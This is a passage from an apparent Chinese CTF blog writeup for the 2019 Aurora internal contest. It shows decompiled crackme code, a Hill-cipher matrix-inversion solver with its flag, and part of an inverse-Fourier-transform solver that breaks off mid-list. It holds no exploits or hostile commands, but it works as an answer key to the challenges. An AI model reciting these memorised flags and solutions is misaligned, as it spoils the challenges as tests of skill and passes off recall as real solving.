m[x[i]].as_long()</span><br><span class="line">    s += <span class="string">f&#x27;<span class="subst">&#123;v:x&#125;</span>&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><h2 id="符号位"><a href="#符号位" class="headerlink" title="符号位"></a>符号位</h2><p>在Z3中，有符号数与无符号数使用不同的运算操作。 <code>&lt;,&lt;=,&gt;,&gt;=,/,%,&gt;&gt;</code>运算对应有符号数，相对应的无符号数运算符为<code>ULT,ULE,UGT,UGE,UDiv,URem,LShR</code></p><p>因此在使用上述运算时，需要注意符号位，如果字符型就要<code>BitVec(flag, 9)</code>, 或者使用无符号运算</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 Aurora</title>
      <link href="/wp-games-2019aurora/"/>
      <url>/wp-games-2019aurora/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录一次内部赛的writeup0.0</p><h2 id="Climb"><a href="#Climb" class="headerlink" title="Climb"></a>Climb</h2><p>题目: <a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/Aurora/Climb/Climb">Climb</a></p><p>可以直接找到main函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-91h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">void</span> *s1; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+90h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Check up:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v8 &lt;= <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v8 % <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid lenth!&quot;</span>);</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest = <span class="built_in">malloc</span>((<span class="keyword">signed</span> <span class="keyword">int</span>)v8);</span><br><span class="line">      s1 = <span class="built_in">malloc</span>((<span class="keyword">signed</span> <span class="keyword">int</span>)v8);</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, &amp;s, (<span class="keyword">signed</span> <span class="keyword">int</span>)v8);</span><br><span class="line">      <span class="built_in">memset</span>(s1, <span class="number">0</span>, (<span class="keyword">signed</span> <span class="keyword">int</span>)v8);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)v8 / <span class="number">7</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">6</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">6</span>; ++k )</span><br><span class="line">            v4 += *((_BYTE *)dest + <span class="number">7</span> * i + k) * climb[<span class="number">7</span> * j + k];<span class="comment">// 输入的每7个为一组, 每个和key异或</span></span><br><span class="line">                                                <span class="comment">// 类似线性代数的矩阵相乘</span></span><br><span class="line">          *((_BYTE *)s1 + <span class="number">7</span> * i + j) = v4;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(s1, &amp;key, <span class="number">70uLL</span>) )           <span class="comment">// 输入长度猜测为70</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Nope.&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(dest);</span><br><span class="line">      <span class="built_in">free</span>(s1);</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那首先将climb和key转化为两个矩阵。然后用扩展欧几里得算法求出, climb行列式的值的逆元, 以求出climb的逆矩阵, 相乘即得答案。</p><p>[希尔密码求解方法]</p><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">key = [[<span class="number">18</span>, <span class="number">245</span>, <span class="number">75</span>, <span class="number">32</span>, <span class="number">157</span>, <span class="number">232</span>, <span class="number">99</span>],[<span class="number">165</span>, <span class="number">54</span>, <span class="number">146</span>, <span class="number">18</span>, <span class="number">221</span>, <span class="number">244</span>, <span class="number">196</span>],[<span class="number">157</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">88</span>, <span class="number">100</span>, <span class="number">184</span>, <span class="number">103</span>],[<span class="number">91</span>, <span class="number">38</span>, <span class="number">206</span>, <span class="number">47</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">135</span>],[<span class="number">200</span>, <span class="number">200</span>, <span class="number">64</span>, <span class="number">21</span>, <span class="number">82</span>, <span class="number">20</span>, <span class="number">156</span>],[<span class="number">202</span>, <span class="number">165</span>, <span class="number">27</span>, <span class="number">33</span>, <span class="number">69</span>, <span class="number">217</span>, <span class="number">235</span>],[<span class="number">49</span>, <span class="number">48</span>, <span class="number">196</span>, <span class="number">231</span>, <span class="number">173</span>, <span class="number">145</span>, <span class="number">174</span>],[<span class="number">250</span>, <span class="number">104</span>, <span class="number">42</span>, <span class="number">189</span>, <span class="number">118</span>, <span class="number">127</span>, <span class="number">243</span>],[<span class="number">134</span>, <span class="number">197</span>, <span class="number">174</span>, <span class="number">127</span>, <span class="number">20</span>, <span class="number">104</span>, <span class="number">70</span>],[<span class="number">170</span>, <span class="number">221</span>, <span class="number">232</span>, <span class="number">219</span>, <span class="number">251</span>, <span class="number">132</span>, <span class="number">231</span>]]</span><br><span class="line"></span><br><span class="line">climb = [[<span class="number">65</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">32</span>],        [<span class="number">104</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">32</span>],        [<span class="number">119</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">118</span>, <span class="number">105</span>],        [<span class="number">114</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">44</span>],        [<span class="number">32</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">114</span>],        [<span class="number">105</span>, <span class="number">100</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">109</span>, <span class="number">111</span>],        [<span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>]]</span><br><span class="line"></span><br><span class="line">climb = numpy.array(climb)</span><br><span class="line">key = mat(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#扩展欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span>(<span class="params">m, n, x, y</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        x = <span class="number">1</span></span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> (m, x, y)</span><br><span class="line">    a1 = b = <span class="number">1</span></span><br><span class="line">    a = b1 = <span class="number">0</span></span><br><span class="line">    c = m</span><br><span class="line">    d = n</span><br><span class="line">    q = <span class="built_in">int</span>(c/d)</span><br><span class="line">    r = c%d</span><br><span class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        c = d</span><br><span class="line">        d = r</span><br><span class="line">        t = a1</span><br><span class="line">        a1 = a</span><br><span class="line">        a = t-q*a</span><br><span class="line">        t = b1</span><br><span class="line">        b1 = b</span><br><span class="line">        b = t-q*b</span><br><span class="line">        q = <span class="built_in">int</span>(c/d)</span><br><span class="line">        r = c%d</span><br><span class="line">    x = a</span><br><span class="line">    y = b</span><br><span class="line">    <span class="keyword">return</span> (d, x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求出逆元x</span></span><br><span class="line"><span class="comment">#print numpy.linalg.det(climb)</span></span><br><span class="line"><span class="comment">#print exgcd(-512070636337, 256, 0, 0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = <span class="number">47</span></span><br><span class="line">a = numpy.dot(numpy.linalg.det(climb), numpy.linalg.inv(climb))<span class="comment">#求出逆矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#约等于取整数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">        a[i][j] = <span class="built_in">round</span>(a[i][j])</span><br><span class="line"></span><br><span class="line">a = a + <span class="number">0x100</span> * <span class="number">1000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print a % 256</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print ((((47 * a) % 256) * key.T )% 256).T #求解出下方的s</span></span><br><span class="line"></span><br><span class="line">s =  [<span class="number">65</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">123</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">52</span>,<span class="number">114</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">119</span>, <span class="number">51</span>,<span class="number">108</span>, <span class="number">108</span>, <span class="number">95</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">55</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">52</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">76</span>, <span class="number">76</span>, <span class="number">95</span>,<span class="number">119</span>, <span class="number">104</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">48</span>,<span class="number">102</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">109</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">114</span>, <span class="number">48</span>, <span class="number">118</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">70</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[j])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>flag : Aurora{7h3n_f4r3_u_w3ll_5w337_cr4g13_HILL_wh3r3_0f3n_71m35_1_v3_r0v3d}</p><h2 id="baby-transform"><a href="#baby-transform" class="headerlink" title="baby_transform"></a>baby_transform</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/Aurora/baby_transform/baby_transform.zip">baby_transform</a></p><p>main函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// ST20_8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v6; <span class="comment">// ST28_8</span></span><br><span class="line">  FILE *n_4; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  FILE *v8; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+90h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;ptr, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  n_4 = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  v8 = fopen(<span class="string">&quot;./enc&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( n_4 )</span><br><span class="line">  &#123;</span><br><span class="line">    fread(&amp;ptr, <span class="number">1uLL</span>, <span class="number">0x64</span>uLL, n_4);</span><br><span class="line">    n = <span class="built_in">strlen</span>(&amp;ptr);</span><br><span class="line">    s = <span class="built_in">malloc</span>(n + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, n + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(s, &amp;ptr, n);</span><br><span class="line">    v6 = <span class="built_in">malloc</span>(<span class="number">16</span> * n);</span><br><span class="line">    Fourier_transform((__int64)s, (__int64)v6, n);<span class="comment">//大佬忘记去符号表了</span></span><br><span class="line">    fwrite(v6, <span class="number">0x10</span>uLL, n, v8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Transfrom completed!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Cannot open the file! Please put the file \&quot;flag\&quot; in the current directory.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可得过程为:读取flag文件-&gt;傅里叶变换-&gt;输出到enc文件</p><p>Fourier_transform函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Fourier_transform</span><span class="params">(__int64 a1, __int64 enc, <span class="keyword">signed</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">double</span> v3; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">double</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+3Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">double</span> v9; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">double</span> v10; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v10 = <span class="number">0.0</span>;</span><br><span class="line">    v9 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (<span class="keyword">double</span>)*(<span class="keyword">unsigned</span> __int8 *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 + a1);</span><br><span class="line">      cexp();</span><br><span class="line">      v9 = <span class="number">-0.0</span> * (<span class="keyword">double</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)i * (<span class="keyword">double</span>)v8 / (<span class="keyword">double</span>)v6 * v3 + v9;</span><br><span class="line">      v10 = v3 * ((<span class="keyword">double</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)i * <span class="number">-6.283185307179586</span> * (<span class="keyword">double</span>)v8++ / (<span class="keyword">double</span>)v6) + v10;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = (<span class="keyword">double</span> *)(<span class="number">16LL</span> * i + enc);</span><br><span class="line">    *v4 = v9;</span><br><span class="line">    v4[<span class="number">1</span>] = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本如下:</p><p>将enc中数据转化为复数表达形式:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">HexToDouble</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* buf)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> n[] = &#123;<span class="number">0x40b2400000000000</span>, <span class="number">0x0000000000000000</span>, <span class="number">0x404f14f61c1d8082</span>, <span class="number">0xc04745c5d3974762</span>, <span class="number">0x405dbbb4eed9353f</span>, <span class="number">0xc0661492505818d6</span>, <span class="number">0x40637853935dff27</span>, <span class="number">0xc072ad04d63916c6</span>, <span class="number">0x40627964dd51b260</span>, <span class="number">0xc06ad4140051d3ca</span>, <span class="number">0xbfff086d44939f40</span>, <span class="number">0x404e81b48b3ed997</span>, <span class="number">0xc052349e55c8ee6c</span>, <span class="number">0xc041f7be0a48876a</span>, <span class="number">0x40569865a98b702a</span>, <span class="number">0xc0556a972993328d</span>, <span class="number">0xc05b35f7edc25b1f</span>, <span class="number">0x4050a5114652c156</span>, <span class="number">0x404086e0bd49eb72</span>, <span class="number">0x40703e0c8dd77064</span>, <span class="number">0xc05194822ef54a76</span>, <span class="number">0x4050f21dc0ae9df8</span>, <span class="number">0x404883219d48105b</span>, <span class="number">0xc071ce21c901b4d2</span>, <span class="number">0x40540064b3432d32</span>, <span class="number">0x40403b07b4d9833e</span>, <span class="number">0xc078a662057caa2e</span>, <span class="number">0xc06a3e337c31fc3f</span>, <span class="number">0xc0437ffffffffeb4</span>, <span class="number">0x404d800000000064</span>, <span class="number">0x406f521c1a036884</span>, <span class="number">0x406b1d468d5aa047</span>, <span class="number">0xc033bbc2d0f22fac</span>, <span class="number">0xc058e4382458343f</span>, <span class="number">0xc046713c446616d8</span>, <span class="number">0x4068bb2f9708025b</span>, <span class="number">0x405188584417c0f1</span>, <span class="number">0xc040b6b095bd67a8</span>, <span class="number">0xc06c47d2cb1f4146</span>, <span class="number">0xc06806b49d729f9c</span>, <span class="number">0x4050ecd192196d91</span>, <span class="number">0x3fd2812924060600</span>, <span class="number">0x406833cd2b3a48f8</span>, <span class="number">0x40608ab46b36670a</span>, <span class="number">0xc059b2169dff4b86</span>, <span class="number">0x40685d70be3f0920</span>, <span class="number">0xc064f6d60ace941c</span>, <span class="number">0x40515023314bbeab</span>, <span class="number">0xc072bec5d78045d3</span>, <span class="number">0x406385e730b6f7f6</span>, <span class="number">0x4057449810fd4454</span>, <span class="number">0x4047572706b145bf</span>, <span class="number">0xc071a235840cdc89</span>, <span class="number">0x400a2c344742e698</span>, <span class="number">0x4052e2a5f1fbdd8e</span>, <span class="number">0x40425611700b4c34</span>, <span class="number">0xc075a00000000000</span>, <span class="number">0xbd734621b3c001e4</span>, <span class="number">0x4052e2a5f1fbdc91</span>, <span class="number">0xc0425611700b4a36</span>, <span class="number">0xc071a235840cdca5</span>, <span class="number">0xc00a2c344742d9c0</span>, <span class="number">0x4057449810fd4589</span>, <span class="number">0xc047572706b14adb</span>, <span class="number">0xc072bec5d78045ca</span>, <span class="number">0xc06385e730b6f8fb</span>, <span class="number">0xc064f6d60ace9424</span>, <span class="number">0xc0515023314bbe12</span>, <span class="number">0xc059b2169dff4c45</span>, <span class="number">0xc0685d70be3f0856</span>, <span class="number">0x406833cd2b3a488a</span>, <span class="number">0xc0608ab46b36666d</span>, <span class="number">0x4050ecd192196be2</span>, <span class="number">0xbfd2812924056700</span>, <span class="number">0xc06c47d2cb1f41c0</span>, <span class="number">0x406806b49d729f86</span>, <span class="number">0x405188584417c1ca</span>, <span class="number">0x4040b6b095bd67d0</span>, <span class="number">0xc046713c446617a5</span>, <span class="number">0xc068bb2f97080274</span>, <span class="number">0xc033bbc2d0f230ed</span>, <span class="number">0x4058e4382458336d</span>, <span class="number">0x406f521c1a036a9e</span>, <span class="number">0xc06b1d468d5a9f0e</span>, <span class="number">0xc0437ffffffff87a</span>, <span class="number">0xc04d7ffffffffde4</span>, <span class="number">0xc078a662057caa54</span>, <span class="number">0x406a3e337c31fb61</span>, <span class="number">0x40540064b3432ed8</span>, <span class="number">0xc0403b07b4d9823e</span>, <span class="number">0x404883219d48130a</span>, <span class="number">0x4071ce21c901b534</span>, <span class="number">0xc05194822ef5490c</span>, <span class="number">0xc050f21dc0ae9df2</span>, <span class="number">0x404086e0bd49e9e7</span>, <span class="number">0xc0703e0c8dd770b0</span>, <span class="number">0xc05b35f7edc259b4</span>, <span class="number">0xc050a5114652c116</span>, <span class="number">0x40569865a98b7096</span>, <span class="number">0x40556a97299332c8</span>, <span class="number">0xc052349e55c8ef33</span>, <span class="number">0x4041f7be0a4886b8</span>, <span class="number">0xbfff086d4493c3c0</span>, <span class="number">0xc04e81b48b3ed8b6</span>, <span class="number">0x40627964dd51b301</span>, <span class="number">0x406ad4140051d2de</span>, <span class="number">0x40637853935dfed6</span>, <span class="number">0x4072ad04d63916fe</span>, <span class="number">0x405dbbb4eed93b0e</span>, <span class="number">0x40661492505819c1</span>, <span class="number">0x404f14f61c1d7ecc</span>, <span class="number">0x404745c5d3974575</span>&#125;;</span><br><span class="line">    <span class="comment">// long long int n = 0x4050400000000000;</span></span><br><span class="line">    <span class="comment">// printf(&quot;%llf&quot;, *(double *)&amp;n);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">56</span>; i++)</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%llf+%llfj, &quot;</span>, *(<span class="keyword">double</span> *)&amp;n[<span class="number">2</span> * i], *(<span class="keyword">double</span> *)&amp;n[<span class="number">2</span> * i + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>快速傅里叶变化:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">ciphertext = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">key = [<span class="number">4672.000000</span>+<span class="number">0.000000j</span></span><br><span class="line">, <span class="number">62.163761</span>+-<span class="number">46.545100j</span></span><br><span class="line">, <span class="number">118.932918</span>+-<span class="number">176.642861j</span></span><br><span class="line">, <span class="number">155.760202</span>+-<span class="number">298.813681j</span></span><br><span class="line">, <span class="number">147.793563</span>+-<span class="number">214.627442j</span></span><br><span class="line">, -<span class="number">1.939557</span>+<span class="number">61.013322j</span></span><br><span class="line">, -<span class="number">72.822164</span>+-<span class="number">35.935487j</span></span><br><span class="line">, <span class="number">90.381205</span>+-<span class="number">85.665476j</span></span><br><span class="line">, -<span class="number">108.843257</span>+<span class="number">66.579179j</span></span><br><span class="line">, <span class="number">33.053734</span>+<span class="number">259.878065j</span></span><br><span class="line">, -<span class="number">70.320446</span>+<span class="number">67.783066j</span></span><br><span class="line">, <span class="number">49.024463</span>+-<span class="number">284.883248j</span></span><br><span class="line">, <span class="number">80.006146</span>+<span class="number">32.461173j</span></span><br><span class="line">, -<span class="number">394.398931</span>+-<span class="number">209.943785j</span></span><br><span class="line">, -<span class="number">39.000000</span>+<span class="number">59.000000j</span></span><br><span class="line">, <span class="number">250.565930</span>+<span class="number">216.914862j</span></span><br><span class="line">, -<span class="number">19.733441</span>+-<span class="number">99.565927j</span></span><br><span class="line">, -<span class="number">44.884652</span>+<span class="number">197.849559j</span></span><br><span class="line">, <span class="number">70.130387</span>+-<span class="number">33.427264j</span></span><br><span class="line">, -<span class="number">226.244482</span>+-<span class="number">192.209548j</span></span><br><span class="line">, <span class="number">67.700291</span>+<span class="number">0.289133j</span></span><br><span class="line">, <span class="number">193.618795</span>+<span class="number">132.334524j</span></span><br><span class="line">, -<span class="number">102.782630</span>+<span class="number">194.920013j</span></span><br><span class="line">, -<span class="number">167.713628</span>+<span class="number">69.252148j</span></span><br><span class="line">, -<span class="number">299.923301</span>+<span class="number">156.184471j</span></span><br><span class="line">, <span class="number">93.071781</span>+<span class="number">46.680878j</span></span><br><span class="line">, -<span class="number">282.138065</span>+<span class="number">3.271584j</span></span><br><span class="line">, <span class="number">75.541378</span>+<span class="number">36.672407j</span></span><br><span class="line">, -<span class="number">346.000000</span>+-<span class="number">0.000000j</span></span><br><span class="line">, <span class="number">75.541378</span>+-<span class="number">36.672407j</span></span><br><span class="line">, -<span class="number">282.138065</span>+-<span class="number">3.271584j</span></span><br><span class="line">, <span class="number">93.071781</span>+-<span class="number">46.680878j</span></span><br><span class="line">, -<span class="number">299.923301</span>+-<span class="number">156.184471j</span></span><br><span class="line">, -<span class="number">167.713628</span>+-<span class="number">69.252148j</span></span><br><span class="line">, -<span class="number">102.782630</span>+-<span 